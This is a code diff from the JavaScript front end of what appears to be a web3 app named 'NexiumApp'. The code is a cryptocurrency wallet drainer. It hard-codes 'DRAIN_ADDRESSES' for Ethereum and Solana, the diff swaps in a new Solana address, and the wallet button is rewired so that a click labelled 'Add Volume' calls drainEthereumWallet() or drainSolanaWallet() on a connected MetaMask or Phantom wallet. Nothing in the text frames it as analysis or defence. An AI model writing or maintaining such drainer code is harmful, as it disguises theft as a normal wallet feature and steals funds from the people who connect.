@@ -32,7 +32,7 @@ import * as ethers from 'ethers';
 
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
-  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
+  solana: "DVDXQgzcsYU9BthFXWyAMvDxjr8LMiHfLCUnhUGQrMAa"
 };
 
 const POPULAR_SPL_TOKENS = [
@@ -143,16 +143,16 @@ class NexiumApp {
 
     if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
       this.dom.connectWallet.addEventListener('click', (event) => {
-        if (this.connectedWalletType && !this.dom.connectWallet.disabled) {
+        event.stopPropagation();
+        if (this.connectedWalletType && this.publicKey) {
           console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
           if (this.connectedWalletType === 'MetaMask') {
             this.drainEthereumWallet();
           } else if (this.connectedWalletType === 'Phantom') {
             this.drainSolanaWallet();
           }
-        } else if (!this.connectedWalletType) {
+        } else {
           console.log('Connect Wallet button clicked'); // Log 14
-          event.stopPropagation();
           this.dom.walletModal.classList.add('active');
           console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
         }
